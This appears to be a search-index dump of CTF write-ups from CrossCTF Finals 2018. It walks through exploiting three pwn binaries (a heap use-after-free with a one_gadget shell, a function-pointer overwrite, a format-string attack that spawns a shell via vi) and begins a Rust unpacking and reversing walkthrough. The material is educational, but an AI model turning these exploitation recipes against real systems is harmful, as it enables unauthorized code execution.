_printf_chk(1LL, \"Bear ID: \"); _isoc99_scanf(\"%x\", &v1->id); _printf_chk(1LL, \"Bear Age: \"); _isoc99_scanf(\"%d\", &v1->age); _printf_chk(1LL, \"Bear Description: \"); read(0, v1->description, 0x80uLL); v1->free_function = (__int64)&free; v1->self_destruct_device_ptr = (__int64)self_destruct_device; puts(\"Bear created!\"); ++num_bears[0]; } return __readfsqword(0x28u) ^ v5; } The typical functionality of build_bear() is to allocate 0xb8 size of memory using malloc() then initialize it using user-provided values, then set the global bears array's last unused element to our the address of the bear ( bears[v0]=v1 , where v0 is the ```num_bears). The 'bear' struct seems to as follows: struct bear{ char name[32]; int id; int age; char desc[128]; void* free_ptr; void* self_destruct_device_ptr; } Once we have 13 bears built already, we enter some sort of secret section, which lets us set admin_enabled to 1, as long as we satisfy some checks. In short, what the checks really want are the characters of \"SUNIATRETNE\" in reverse. IDA Pro sometimes goofs up its decompiler. What the v3-- == \"nt\" really means is v3-- == (__int64)SUNIATRETNE\"-1 , or whether v3-- points to the byte before the \"S\". The above can be simplified to v3 = (__int64)\"SUNIATRETNE\"; // v3 is a POINTER _printf_chk(1LL, \"Here we are now... \"); while ( 1 ) { read(0, &buf, 1uLL); if ( v3[10] != buf ) break; if ( --v3 == (__int64)\"SUNIATRETNE\"-1) { read(0, &buf, 1uLL); admin_enabled = 1; return __readfsqword(0x28u) ^ v5; } } On to the next function ... unsigned __int64 select_bear() { unsigned int v1; // [rsp+4h] [rbp-14h] unsigned __int64 v2; // [rsp+8h] [rbp-10h] v2 = __readfsqword(0x28u); v1 = 0; _printf_chk(1LL, \"Selection: \"); _isoc99_scanf(\"%d\", &v1); if ( (v1 & 0x80000000) == 0 && v1 < *num_bears ) selected_bear = (void *)bears[v1]; else puts(\"Not enough bears.\"); return __readfsqword(0x28u) ^ v2; } The program reads in a number, lets say a . If it is not negative and if it is lesser than num_bears, selected_bear will now have a copy of the pointer to the bear at index a . Else, it prints out \"Not enough bears\". (v1 & 0x800000000)==0 means first bit of v1 == 0 , and the first bit of a integer is its sign bit, according to 2s complement notation. int delete_bear() { if ( !selected_bear ) return puts(\"No bear selected!\"); _printf_chk(1LL, \"Deleting [%s]...\\n\"); if ( (void (**)(void *))selected_bear->free_function == &free ) free(selected_bear); return puts(\"Deleted!\"); } The function free()'s the pointer in selected_bear , as long as the free_function still points to free. The selected_bear is not zero'ed out. The bears[idx] is not zero'ed out. This challenge is a typical UAF challenge. num_bears is not decremented int print_bear() { __int64 v0; // rdx __int64 v1; // rdx if ( !selected_bear ) return puts(\"No bear selected!\"); puts(art); _printf_chk(1LL, \"You have selected: [%s]\\n\"); v0 = (unsigned int)selected_bear->id; _printf_chk(1LL, \"It's ID is %x\\n\"); v1 = (unsigned int)selected_bear->age; _printf_chk(1LL, \"It's AGE is %d\\n\"); return _printf_chk(1LL, \"It's DESCRIPTION is %s\\n\"); } This function just prints out information about the selected_bear . unsigned __int64 add_comment() { unsigned int nbytes; _printf_chk(1LL, \"How long should the comment be: \"); _isoc99_scanf(\"%d\", &nbytes); comment = calloc(nbytes + 1, 1uLL); _printf_chk(1LL, \"Comment: \"); read(0, comment, nbytes[0]); return; } Here comes the main tool to exploit the UAF vulneraribility. This function reads in a number then calls calloc(nbytes+1, 1) , which is the same as malloc(nbytes+1) . If we delete_bear() then add_comment() of size 0xb8-1 , we can control ALL OF THE BEAR, including its self_destruct_device_ptr , which will be called later on... Insert evil laugh here int print_comment() { int result; // eax if ( comment ) result = puts((const char *)comment); else result = puts(\"No\"); return result; } Pretty basic, prints the comment or prints \"No\" if theres no comment. int destruction() { int result; // eax if ( !admin_enabled ) return puts(\"Nothing to do\"); result = (signed int)selected_bear; if ( selected_bear ) result = (selected_bear->self_destruct_device_ptr)(*num_bears); return result; } If admin_enabled is true and selected_bear is valid, we can execute selected_bear 's self_destruct_device_ptr","title":"Static Analysis"},{"location":"crossctf-finals2018/pwn/gruffybear/#solution","text":"As mentioned earlier, this is a typical UAF challenge. The obvious steps so far are: 1. Build Bear 1. Put arbitrary data 2. Select Bear 1. Select 0 3. Delete Bear 4. Add Comment 1. The size of the comment must be 0xb8-1 , so that we calloc(0xb8,1) and so that it will reuse the free memory that belonged to bears[0] 2. We can send 0xb0 arbitrary bytes, then send our desired function pointer, let's say, 0xcafebabe 5. We call Build Bear 12 more times 1. Put arbitrary data again 6. Build Bear (we already have 13 bears, this will go to the secret section now) 1. This time, we send SUNIATRETNE in reverse, and this will set admin_enabled to 1 7. Destruction Now the question is, what do we want to execute? There isn't any function that can give shell, and we don't know the address of any function since it is a PIE binary anyway $ checksec gruffybear Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled Lets go hunting for a leak! Actually thats really easy, since we are freeing a smallbin-sized chunk (0xb8 = 184) . If you see the structure of a free malloc_chunk in the smallbin size range, the first 8 bytes are a pointer to the smallbin, called fd , which are the first 8 bytes of the bear's name. To do this, we need to allocate another chunk first (build another bear) so that the chunk above ours is not the top chunk. We can use print_bear() to leak this address, then call a libc function. So now, do we call system()? We can't though, since we are passing the num_bears as its argument. Instead, we can use something called 'magic gadgets', which are places in libc we can jump to so that we can instantly get shell as long as some constraints are valid. I use the tool one_gadget to do this. $ one_gadget libc-2.23.so 0x45216 execve(\"/bin/sh\", rsp+0x30, environ) constraints: rax == NULL 0x4526a execve(\"/bin/sh\", rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf02a4 execve(\"/bin/sh\", rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1147 execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL I chose the second last one (it was at random) So now, our steps are as follows 1. Build Bear 1. Put arbitrary data 1. Build Bear 1. Put arbitrary data 2. Select Bear 1. Select 0 3. Delete Bear 4. Print Bear 1. This will give us the libc smallbin address for size 0xb8 (in the name) 2. This address is also 0x70+__realloc_hook, which was the calculation I used 4. Add Comment 1. The size of the comment must be 0xb8-1 , so that we calloc(0xb8,1) and so that it will reuse the free memory that belonged to bears[0] 2. We can send 0xb0 arbitrary bytes, then send our desired function pointer, which is libc_base+0xf02a4 3. It only reads in 0xb7 bytes, so remember to remove the last byte from the input (its a null byte anyway) 5. We call Build Bear 11 more times 1. Put arbitrary data again 6. Build Bear (we already have 13 bears, this will go to the secret section now) 1. This time, we send SUNIATRETNE in reverse, and this will set admin_enabled to 1 7. Destruction The final solution is in here","title":"Solution"},{"location":"crossctf-finals2018/pwn/slowmo/","text":"CrossCTF Finals 2018 : Slowmo (Pwn) First Blood by : OSI Layer 8 What is in this mysterious package? nc ctf.pwn.sg 4005 Creator - amon (@nn_amon) Static Analysis Run file slowmo : slowmo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=0c6352b62e9c246c5530b20dc13a5d82c60619cc, stripped Running IDA Pro on the binary, I got code that I originally thought was some sort of language-specific setup code, like Go's runtime initialization. I had no idea what to do, so I went to solve other challenges. Much later into the competition, the source code was released: #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/mman.h> int happy = 0; void (*indirection)(); char tape[256]; void dis() { system(\"/bin/date\"); } void dos() { system(\"/bin/sh\"); } int main() { indirection = dis; char * ptr = tape + 128; alarm(30); char inst; while (1) { if (happy) { for (int i = 0; i < 256; i++) { printf(\"/%02x\", tape[i]); } printf(\"/\\n\"); } read(0, &inst, 1); switch (inst) { case '<': ++ptr; break; case '>': --ptr; break; case '^': *ptr += 1; break; case 'v': *ptr -= 1; break; case '!': indirection(); return 0; case '`': happy = 1; } } } I actually had this function in IDA's analysis, but I thought it was some junk: int __fastcall sub_105EC(int a1, int a2) { unsigned int v2; // r0 int result; // r0 unsigned __int8 v4; // [sp+3h] [bp-11h] _BYTE *v5; // [sp+4h] [bp-10h] int v6; // [sp+8h] [bp-Ch] int v7; // [sp+Ch] [bp-8h] v7 = dword_97F8C; dword_99EBC = (int (__fastcall *)(_DWORD))sub_105B4; v5 = &unk_99E3C; sub_279F8(30, a2, (int)sub_105B4, &unk_99E3C); while ( 1 ) { while ( 1 ) { while ( 1 ) { if ( dword_98EEC ) { v6 = 0; if ( v6 <= 255 ) printf(\"/%02x\", byte_99DBC[v6]); sub_17E30(); } v2 = sub_28620(0, &v4, (void *)1, &v4); if ( v4 != '>' ) break; --v5; } if ( (signed int)v4 <= 62 ) break; switch ( v4 ) { case 0x60u: dword_98EEC = 1; break; case 0x76u: --*v5; break; case 0x5Eu: ++*v5; break; } } if ( v4 == 33 ) break; if ( v4 == 60 ) ++v5; } dword_99EBC(v2); result = 0; if ( v7 != dword_97F8C ) sub_2AB9C(0); return result; } ~~This was where I realised that I hate stripping~~. Oh well, time to solve. We can see that we can manipulate where ptr points to and decrement/increment the byte pointed by it. The solution is rather obvious. The ptr originally points to tape+128 Solution Right after the tape[256] array is the indirection function pointer (in terms of program memory). So we move the pointer by 128 again (send '<' 128 times). Then increment/decrement the bytes of the function pointer indirection till it points to dos instead of dis (send 'v' or '^' abs( address of dos - address of dis ) number of times, use '^' if dos is after dis or 'v' otherwise) Call indirection() (send '!') and we get shell. How do find where dos() and dis() are located? The binary is stripped after all. Well, function names are stripped, but strings are not obfuscated. But we can search for '/bin/date' and '/bin/sh', then find references to these strings. .rodata:00071E9C aBinDate DCB \"/bin/date\",0 ; DATA XREF: sub_105B4+8\u2191o .rodata:00071E9C ; .text:off_105CC\u2191o .rodata:00071EA6 ALIGN 4 .rodata:00071EA8 aBinSh_0 DCB \"/bin/sh\",0 ; DATA XREF: .text:000105D8\u2191o .rodata:00071EA8 ; .text:off_105E8\u2191o Next, we see what are the starting addresses of these functions: .text:000105B4 sub_105B4 ; DATA XREF: sub_105EC+1C\u2193o .text:000105B4 ; .text:off_10778\u2193o .text:000105B4 STMFD SP!, {R11,LR} .text:000105B8 ADD R11, SP, #4 .text:000105BC LDR R0, =aBinDate ; \"/bin/date\" .text:000105C0 BL sub_17428 .text:000105C4 NOP .text:000105C8 LDMFD SP!, {R11,PC} .text:000105C8 ; End of function sub_105B4 .text:000105C8 .text:000105C8 ; --------------------------------------------------------------------------- .text:000105CC off_105CC DCD aBinDate ; DATA XREF: sub_105B4+8\u2191r .text:000105CC ; \"/bin/date\" .text:000105D0 ; --------------------------------------------------------------------------- .text:000105D0 STMFD SP!, {R11,LR} .text:000105D4 ADD R11, SP, #4 .text:000105D8 LDR R0, =aBinSh_0 ; \"/bin/sh\" .text:000105DC BL sub_17428 .text:000105E0 NOP .text:000105E4 LDMFD SP!, {R11,PC} .text:000105E4 ; --------------------------------------------------------------------------- .text:000105E8 off_105E8 DCD aBinSh_0 ; DATA XREF: .text:000105D8\u2191r .text:000105E8 ; \"/bin/sh\" .text:000105EC ARM functions (usually) begin with STMFD instructions, so we can ascertain that dis() is at 0xB4 while dos() is at 0xD0 . Our solution is now: 1. Send < a total of 128 times 2. Send ^ a total of (0xD0-0xB4) times 3. Send ! 4. Profit The solution script is here","title":"Slowmo"},{"location":"crossctf-finals2018/pwn/slowmo/#crossctf-finals-2018-slowmo-pwn","text":"","title":"CrossCTF Finals 2018 : Slowmo (Pwn)"},{"location":"crossctf-finals2018/pwn/slowmo/#first-blood-by-osi-layer-8","text":"What is in this mysterious package? nc ctf.pwn.sg 4005 Creator - amon (@nn_amon)","title":"First Blood by : OSI Layer 8"},{"location":"crossctf-finals2018/pwn/slowmo/#static-analysis","text":"Run file slowmo : slowmo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=0c6352b62e9c246c5530b20dc13a5d82c60619cc, stripped Running IDA Pro on the binary, I got code that I originally thought was some sort of language-specific setup code, like Go's runtime initialization. I had no idea what to do, so I went to solve other challenges. Much later into the competition, the source code was released: #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/mman.h> int happy = 0; void (*indirection)(); char tape[256]; void dis() { system(\"/bin/date\"); } void dos() { system(\"/bin/sh\"); } int main() { indirection = dis; char * ptr = tape + 128; alarm(30); char inst; while (1) { if (happy) { for (int i = 0; i < 256; i++) { printf(\"/%02x\", tape[i]); } printf(\"/\\n\"); } read(0, &inst, 1); switch (inst) { case '<': ++ptr; break; case '>': --ptr; break; case '^': *ptr += 1; break; case 'v': *ptr -= 1; break; case '!': indirection(); return 0; case '`': happy = 1; } } } I actually had this function in IDA's analysis, but I thought it was some junk: int __fastcall sub_105EC(int a1, int a2) { unsigned int v2; // r0 int result; // r0 unsigned __int8 v4; // [sp+3h] [bp-11h] _BYTE *v5; // [sp+4h] [bp-10h] int v6; // [sp+8h] [bp-Ch] int v7; // [sp+Ch] [bp-8h] v7 = dword_97F8C; dword_99EBC = (int (__fastcall *)(_DWORD))sub_105B4; v5 = &unk_99E3C; sub_279F8(30, a2, (int)sub_105B4, &unk_99E3C); while ( 1 ) { while ( 1 ) { while ( 1 ) { if ( dword_98EEC ) { v6 = 0; if ( v6 <= 255 ) printf(\"/%02x\", byte_99DBC[v6]); sub_17E30(); } v2 = sub_28620(0, &v4, (void *)1, &v4); if ( v4 != '>' ) break; --v5; } if ( (signed int)v4 <= 62 ) break; switch ( v4 ) { case 0x60u: dword_98EEC = 1; break; case 0x76u: --*v5; break; case 0x5Eu: ++*v5; break; } } if ( v4 == 33 ) break; if ( v4 == 60 ) ++v5; } dword_99EBC(v2); result = 0; if ( v7 != dword_97F8C ) sub_2AB9C(0); return result; } ~~This was where I realised that I hate stripping~~. Oh well, time to solve. We can see that we can manipulate where ptr points to and decrement/increment the byte pointed by it. The solution is rather obvious. The ptr originally points to tape+128","title":"Static Analysis"},{"location":"crossctf-finals2018/pwn/slowmo/#solution","text":"Right after the tape[256] array is the indirection function pointer (in terms of program memory). So we move the pointer by 128 again (send '<' 128 times). Then increment/decrement the bytes of the function pointer indirection till it points to dos instead of dis (send 'v' or '^' abs( address of dos - address of dis ) number of times, use '^' if dos is after dis or 'v' otherwise) Call indirection() (send '!') and we get shell. How do find where dos() and dis() are located? The binary is stripped after all. Well, function names are stripped, but strings are not obfuscated. But we can search for '/bin/date' and '/bin/sh', then find references to these strings. .rodata:00071E9C aBinDate DCB \"/bin/date\",0 ; DATA XREF: sub_105B4+8\u2191o .rodata:00071E9C ; .text:off_105CC\u2191o .rodata:00071EA6 ALIGN 4 .rodata:00071EA8 aBinSh_0 DCB \"/bin/sh\",0 ; DATA XREF: .text:000105D8\u2191o .rodata:00071EA8 ; .text:off_105E8\u2191o Next, we see what are the starting addresses of these functions: .text:000105B4 sub_105B4 ; DATA XREF: sub_105EC+1C\u2193o .text:000105B4 ; .text:off_10778\u2193o .text:000105B4 STMFD SP!, {R11,LR} .text:000105B8 ADD R11, SP, #4 .text:000105BC LDR R0, =aBinDate ; \"/bin/date\" .text:000105C0 BL sub_17428 .text:000105C4 NOP .text:000105C8 LDMFD SP!, {R11,PC} .text:000105C8 ; End of function sub_105B4 .text:000105C8 .text:000105C8 ; --------------------------------------------------------------------------- .text:000105CC off_105CC DCD aBinDate ; DATA XREF: sub_105B4+8\u2191r .text:000105CC ; \"/bin/date\" .text:000105D0 ; --------------------------------------------------------------------------- .text:000105D0 STMFD SP!, {R11,LR} .text:000105D4 ADD R11, SP, #4 .text:000105D8 LDR R0, =aBinSh_0 ; \"/bin/sh\" .text:000105DC BL sub_17428 .text:000105E0 NOP .text:000105E4 LDMFD SP!, {R11,PC} .text:000105E4 ; --------------------------------------------------------------------------- .text:000105E8 off_105E8 DCD aBinSh_0 ; DATA XREF: .text:000105D8\u2191r .text:000105E8 ; \"/bin/sh\" .text:000105EC ARM functions (usually) begin with STMFD instructions, so we can ascertain that dis() is at 0xB4 while dos() is at 0xD0 . Our solution is now: 1. Send < a total of 128 times 2. Send ^ a total of (0xD0-0xB4) times 3. Send ! 4. Profit The solution script is here","title":"Solution"},{"location":"crossctf-finals2018/pwn/souvlaki/","text":"CrossCTF Finals 2018 : Souvlaki Space Station (Pwn) First Blood by : OSI Layer 8 Pictures and I've fallen Wonder why I'm here now nc ctf.pwn.sg 4006 Creator - amon (@nn_amon) Hint: Try examining the use of 'strlen()' and 'signal()'. Static Analysis ~~Well what do you know, I'm really starting to hate ARM~~ Static analysis using IDA just fails. The printed code was 5 lines long and the function calls did not match what was actually being called in the function at runtime. Viewing the function in graph mode, there are pieces of code that IDA just didn't detect as part of the control flow graph, and goofed up. I was determined to actually learn ARM assembly in the last 8 hours or so, but luckily the source was released soon after ;) #include <stdio.h> #include <sys/types.h> #include <unistd.h> #include <signal.h> #include <stdlib.h> #include <stdint.h> #include <string.h> typedef struct state { int admin; char message[128]; char * presenter; size_t length; } state; state global_state; void sighandler(int signum) { signal(signum, SIG_DFL); puts(\"souvlaki.c:10:5: warning: implicit declaration of function \u2018exit\u2019 [-Wimplicit-function-declaration]\"); puts(\" exit(1);\"); puts(\"souvlaki.c:10:5: warning: incompatible implicit declaration of built-in function \u2018exit\u2019\"); puts(\"souvlaki.c:10:5: note: include \u2018<stdlib.h>\u2019 or provide a declaration of \u2018exit\u2019\"); if (global_state.admin) { puts(\"To report this bug, please contact support@linux.org.\"); execl(\"/usr/bin/vi\", NULL); } exit(1); } void init() { global_state.admin = 0; strcpy(global_state.message, \"P L A C E H O L D E R T E X T M A N\"); global_state.presenter = \"[EC2 (%lld/150)]: \"; global_state.length = strlen(global_state.message) + 1; } int main() { state * ptr = &global_state; ++ptr; --ptr; init(); // Disable buffering on stdin, stdout, and stderr setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); signal(SIGSEGV, sighandler); uint64_t count = 1; while (count <= 150) { printf(global_state.presenter, count); read(0, global_state.message, global_state.length); global_state.length = strlen(global_state.message) + 1; for (int i = 0; i < global_state.length; i++) { if (global_state.message[i] == '\\n') { global_state.message[i] = 0; } } for (int i = 0 ; i < global_state.length; i++) { printf(\"%hhd \", global_state.message[i]); } puts(\"\"); ++count; } return 0; } We have a signal handler set for SIGSEGV , segmentation fault, that runs vi . You can actually get shell from vi by going to command mode (type : ), then entering !sh . Of couse, you need to set global_state.admin to a non-zero value first. There's a very subtle bug in the while loop in main(). From these: read(0, global_state.message, global_state.length); global_state.length = strlen(global_state.message) + 1; We can see that global_state.length is intended to be used as the actual string length in read() , but we set it to actual string length (of the message) + 1 in the next line. Thus, we can increase global_state.length by 1 if we fill up the global_state.message (send 'a' * the current global_state.length ). Solution If we can fill the entire 128 bytes of global_state.message (and make sure not to send any '\\n'), strlen(global_state.message) will actually give us 128 + number of non-zero bytes of global_state.presenter . Thus, we can edit the value of global_state.presenter as long as the value we want to write isn't too big. Note that 37 bytes are already filled with a pre-existing message. If we change it to the address of our input, we can try to do a format string attack, since global_state.presenter is used as the formatting argument to printf. Luckily, PIE isn't enabled, and the global_state is stored in the .bss section, so we can write it with the address of our input, which is 0x98ca0 $ checksec souvlaki Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x10000) Now we need to set global_state.admin to a non-zero value, and then crash the program. Dynamic Analysis Now, I knew very little about ARM architecture and how printf() worked with its registers and stack, so I made the input a long string of \"%p ...\" first. Luckily the 7th argument printed out was the address of global_state.admin ( 0x00098c9c ), and some arguments were very low values, like the 2nd argument (attempting to write to them would likely segfault). Now, we do a typical format string attack in our input by sending \"A%7$n\" (the 'A' is there so that 1 byte is printed already, and %n will write 1 to the address that is the 7th argument), then just try to print to the 2nd argument using \"%2$n\", which will crash the program and run vi for us. We have to pad this to 128 bytes, then finally send in our input's address. Once vi starts up, we type in :!sh to get shell Solution code in here","title":"Souvlaki Space Station"},{"location":"crossctf-finals2018/pwn/souvlaki/#crossctf-finals-2018-souvlaki-space-station-pwn","text":"","title":"CrossCTF Finals 2018 : Souvlaki Space Station (Pwn)"},{"location":"crossctf-finals2018/pwn/souvlaki/#first-blood-by-osi-layer-8","text":"Pictures and I've fallen Wonder why I'm here now nc ctf.pwn.sg 4006 Creator - amon (@nn_amon) Hint: Try examining the use of 'strlen()' and 'signal()'.","title":"First Blood by : OSI Layer 8"},{"location":"crossctf-finals2018/pwn/souvlaki/#static-analysis","text":"~~Well what do you know, I'm really starting to hate ARM~~ Static analysis using IDA just fails. The printed code was 5 lines long and the function calls did not match what was actually being called in the function at runtime. Viewing the function in graph mode, there are pieces of code that IDA just didn't detect as part of the control flow graph, and goofed up. I was determined to actually learn ARM assembly in the last 8 hours or so, but luckily the source was released soon after ;) #include <stdio.h> #include <sys/types.h> #include <unistd.h> #include <signal.h> #include <stdlib.h> #include <stdint.h> #include <string.h> typedef struct state { int admin; char message[128]; char * presenter; size_t length; } state; state global_state; void sighandler(int signum) { signal(signum, SIG_DFL); puts(\"souvlaki.c:10:5: warning: implicit declaration of function \u2018exit\u2019 [-Wimplicit-function-declaration]\"); puts(\" exit(1);\"); puts(\"souvlaki.c:10:5: warning: incompatible implicit declaration of built-in function \u2018exit\u2019\"); puts(\"souvlaki.c:10:5: note: include \u2018<stdlib.h>\u2019 or provide a declaration of \u2018exit\u2019\"); if (global_state.admin) { puts(\"To report this bug, please contact support@linux.org.\"); execl(\"/usr/bin/vi\", NULL); } exit(1); } void init() { global_state.admin = 0; strcpy(global_state.message, \"P L A C E H O L D E R T E X T M A N\"); global_state.presenter = \"[EC2 (%lld/150)]: \"; global_state.length = strlen(global_state.message) + 1; } int main() { state * ptr = &global_state; ++ptr; --ptr; init(); // Disable buffering on stdin, stdout, and stderr setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); signal(SIGSEGV, sighandler); uint64_t count = 1; while (count <= 150) { printf(global_state.presenter, count); read(0, global_state.message, global_state.length); global_state.length = strlen(global_state.message) + 1; for (int i = 0; i < global_state.length; i++) { if (global_state.message[i] == '\\n') { global_state.message[i] = 0; } } for (int i = 0 ; i < global_state.length; i++) { printf(\"%hhd \", global_state.message[i]); } puts(\"\"); ++count; } return 0; } We have a signal handler set for SIGSEGV , segmentation fault, that runs vi . You can actually get shell from vi by going to command mode (type : ), then entering !sh . Of couse, you need to set global_state.admin to a non-zero value first. There's a very subtle bug in the while loop in main(). From these: read(0, global_state.message, global_state.length); global_state.length = strlen(global_state.message) + 1; We can see that global_state.length is intended to be used as the actual string length in read() , but we set it to actual string length (of the message) + 1 in the next line. Thus, we can increase global_state.length by 1 if we fill up the global_state.message (send 'a' * the current global_state.length ).","title":"Static Analysis"},{"location":"crossctf-finals2018/pwn/souvlaki/#solution","text":"If we can fill the entire 128 bytes of global_state.message (and make sure not to send any '\\n'), strlen(global_state.message) will actually give us 128 + number of non-zero bytes of global_state.presenter . Thus, we can edit the value of global_state.presenter as long as the value we want to write isn't too big. Note that 37 bytes are already filled with a pre-existing message. If we change it to the address of our input, we can try to do a format string attack, since global_state.presenter is used as the formatting argument to printf. Luckily, PIE isn't enabled, and the global_state is stored in the .bss section, so we can write it with the address of our input, which is 0x98ca0 $ checksec souvlaki Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x10000) Now we need to set global_state.admin to a non-zero value, and then crash the program.","title":"Solution"},{"location":"crossctf-finals2018/pwn/souvlaki/#dynamic-analysis","text":"Now, I knew very little about ARM architecture and how printf() worked with its registers and stack, so I made the input a long string of \"%p ...\" first. Luckily the 7th argument printed out was the address of global_state.admin ( 0x00098c9c ), and some arguments were very low values, like the 2nd argument (attempting to write to them would likely segfault). Now, we do a typical format string attack in our input by sending \"A%7$n\" (the 'A' is there so that 1 byte is printed already, and %n will write 1 to the address that is the 7th argument), then just try to print to the 2nd argument using \"%2$n\", which will crash the program and run vi for us. We have to pad this to 128 bytes, then finally send in our input's address. Once vi starts up, we type in :!sh to get shell Solution code in here","title":"Dynamic Analysis"},{"location":"crossctf-finals2018/re/iamrusty/","text":"CrossCTF Finals 2018 : Rochefort 8 (re) Decrypt the encrypted flag! Creator - quanyang (@quanyang) iamrusty The encrypted flag is [193, 43, 110, 37, 49, 203, 177, 168, 213, 56, 111, 114, 136, 234, 91, 129, 74, 3, 134, 159, 134, 47, 53, 245, 103, 247, 251, 52, 198, 245, 208, 139, 188, 151, 208, 36, 109, 245, 48, 174, 123, 154] Summary We are given a stripped binary, which name suggests to be a Rust binary. Reversing it, we see that it performs some form of variation of RC4, and we will use it to decrypt our flag. The steps taken to reverse this binary are: Apply zignatures Find main Reverse encryption algorithm Decrypt the flag Analysis For this challenge, I used r2 as I am more familiar with it compared to IDA. Like usual, start by running file on the binary and executing it to see what it is about. $ file iamrusty iamrusty: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), statically linked, stripped $ ./iamrusty [1] 28689 segmentation fault ./iamrusty We see that it is a statically linked, stripped binary. Weirdly, it crashes. Anyways, load the binary in analysis mode in r2. $ r2 -A iamrusty Then, use afl to check the functions. [0x0012be40]> afl 0x0012be40 3 50 entry0 0x0012be72 7 62 fcn.0012be72 0x0012beb0 20 164 fcn.0012beb0 0x0012c01c 9 17 -> 124 fcn.0012c01c 0x0012c02d 15 107 -> 228 fcn.0012c02d 0x0012c098 1 34 fcn.0012c098 We see only 6 functions. There are a few possible reasons to this: The binary is statically linked and uses very minimal amount of library functions The binary is written by hand The binary is packed Looking into entry0 , we see We see some initialization and call fcn.0012beb0 . Peeking into it in graph view, we see a rather complicated graph, and non-typical instructions like call r11 . This eliminates the possiblity that it is hand-written assembly. It is also unlikely to be the first case, as normally there would be a __libc_start_main function call at the start. Hence, we should explore the possibility that it is packed. Using strings on the binary, we see UPX! on the first line. Ah, it is a UPX packed binary. We can unpack it to analyse it. $ upx -d iamrusty -o unpacked Now, running file again and executing the binary. $ file unpacked unpacked: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=6d25298b54bfbbf751f73e6e0833e24961702770, stripped $ ./unpacked The encrypted flag is [213, 49, 96, 34, 11, 251, 177, 134, 203, 44, 118, 96, 155, 172] Now this makes more sense. Let's also run strings on it. Doing so, we see strings like \"jemalloc\" or strings contaning \"rs\". So, we can confirm that this is a Rust binary. Apply zigs Before starting to analyse the binary, since it is stripped, this means it will be very difficult to know what each function does. I made use of zignatures to try to identify each function. The radare2 book has a more detailed documentation of the zignatures namespace. I prepared a zignature file which contains the signatures of most commonly used Rust standard library functions. To do this, don't load the binary in analysis mode, just plain r2 ./unpacked . Then, load the zignature file, apply it to our binary, and only after that use aaa to analyse it. [0x00006c01]> zo /home/daniel/REsources/zigs/rust/rust.z [0x00006c01]> z/ [+] searching 0x00000000 - 0x00063794 0x0000cb20 Sequencial hit ignored. 0x0000cb60 Sequencial hit ignored. 0x0000cb20 Sequencial hit ignored. 0x0000cb60 Sequencial hit ignored. 0x0000cb20 Sequencial hit ignored. 0x0000cb60 Sequencial hit ignored. 0x0000cb20 Sequencial hit ignored. 0x0000cb60 Sequencial hit ignored. 0x0000cb20 Sequencial hit ignored. 0x0000cb60 Sequencial hit ignored. 0x00014240 Sequencial hit ignored. 0x00014240 Sequencial hit ignored. 0x00014240 Sequencial hit ignored. 0x00014240 Sequencial hit ignored. 0x00014240 Sequencial hit ignored. 0x00014240 Sequencial hit ignored. 0x00015b00 Sequencial hit ignored. 0x00015b00 Sequencial hit ignored. 0x00017780 Sequencial hit ignored. 0x00017780 Sequencial hit ignored. 0x00017780 Sequencial hit ignored. 0x00017780 Sequencial hit ignored. 0x00017780 Sequencial hit ignored. [+] searching 0x00263900 - 0x002683b8 [+] searching function metrics hits: 206 [0x00006c01]> aaa [x] Analyze all flags starting with sym. and entry0 (aa) [x] Analyze len bytes of instructions for references (aar) [ WARNING : block size exceeding max block size at 0x0000d7a0 [+] Try changing it with e anal.bb.maxsize [x] Analyze function calls (aac) [x] Use -AA or aaaa to perform additional experimental analysis. [x] Constructing a function name for fcn.* and sym.func.* functions (aan) It is not perfect. It will not successfully label every single function in there, but it was really helpful in identifying functions like sign.bytes.sym.core::fmt::Write::write_fmt::hda0de9044a822dbe_2 sign.bytes.sym.core::fmt::Formatter::pad_integral::__u7b__u7b_closure_u7d__u7d_::h405811ed46957e23_0 which helped a lot in guessing what a function does. Find main One major problem with this being a stripped binary means we don't know where main is, and it is not as obvious as typical C binaries. Typically, for C binaries, the program will enter main after the call of __libc_start_main . However, for Rust, after __libc_start_main , the program does a lot of setting up, before going into the actual main . And since it is a stripped binary, we won't know which function call is main or for setting up! Useful pattern However, I am not completely stuck. From trying to reverse different simple Rust binaries I compiled myself, I noticed a very helpful pattern. It turns out that regardless of whatever or however much set up is being done at the start, before executing the actual main , Rust will execute the following instruction block. jmp QWORD PTR [rsi + 0x18] ... # a few instructions call QWORD [rdi] There will always be a jmp to [rsi + 0x18] , and after a few instructions that may differ depending on the binary, it will call QWORD [rdi] , bringing us into the real main . Using backtrace Now that we have an idea of what to look for, we can further narrow down our search space by making use of the backtrace at the point where the program prints the encrypted flag. This is because the printing must be called inside main , so the address of an instruction that calls main will be inside the backtrace for sure. For this part, I used GEF. To add a breakpoint when the encrypted is being printed, we can set a catchpoint at a write syscall. gef\u27a4 catch syscall write Then use r to start executing the binary, and bt to view the backtrace. gef\u27a4 bt #0 0x00007ffff7f7f291 in __libc_write (fd=0x1, buf=0x7ffff761c000, nbytes=0x57) at ../sysdeps/unix/sysv/linux/write.c:27 #1 0x0000555555560e9c in ?? () #2 0x0000555555562278 in ?? () #3 0x0000555555561568 in ?? () #4 0x000055555556a0f6 in ?? () #5 0x00005555555625db in ?? () #6 0x000055555556e696 in ?? () #7 0x000055555556eb43 in ?? () #8 0x000055555556ddb3 in ?? () 